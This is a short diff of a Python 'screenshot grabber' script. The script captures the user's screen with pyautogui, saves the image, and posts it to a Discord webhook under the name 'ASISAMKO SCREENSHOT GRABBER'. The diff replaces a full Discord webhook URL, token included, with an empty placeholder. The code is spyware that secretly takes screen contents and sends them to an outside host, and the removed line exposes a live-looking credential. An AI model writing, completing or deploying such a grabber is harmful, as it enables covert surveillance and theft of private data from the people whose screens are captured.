@@ -10,7 +10,7 @@ screenshot = pyautogui.screenshot()
 screenshot.save("screenshot.jpg")
 
 # Set the webhook
-webhook = DiscordWebhook(url="https://discord.com/api/webhooks/1221162536242642984/-SkHB0oWPkm6Tugq3Zj1VcqmUjxVF75aax_2Dmsaqpyg0fnFlxQGvjnq5R_cecKlYHWk", # Enter your Discord Webhook address
+webhook = DiscordWebhook(url="", # Enter your Discord Webhook address
                          username="ASISAMKO SCREENSHOT GRABBER") # Enter Webhook name
 
 embed = DiscordEmbed(title="New Screenshot Grabbed 👁️",
